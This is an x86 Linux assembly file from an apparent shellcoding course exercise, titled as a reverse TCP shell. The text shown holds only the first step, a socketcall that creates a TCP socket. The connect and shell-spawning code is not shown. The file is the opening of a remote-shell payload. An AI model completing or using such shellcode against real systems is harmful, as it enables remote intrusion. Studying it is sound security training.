; Filename: reversetcp.asm
; Author:   Reuben Sammut
; SLAE ID:  510

global _start

section .text

_start:
	; create socket
	xor eax, eax
	cdq		 ; extend sign of eax to edx (edx = 0)
	mov ebx, eax
	mov al, 0x66 	 ; socketcall
	mov bl, 0x1 	 ; cmd = socket (1)

	push edx 	 ; protocol = 0
	push 0x1 	 ; type = SOCK_STREAM (1)
	push 0x2 	 ; domain = AF_INET (2)
	lea ecx, [esp]
	int 0x80
	mov edi, eax


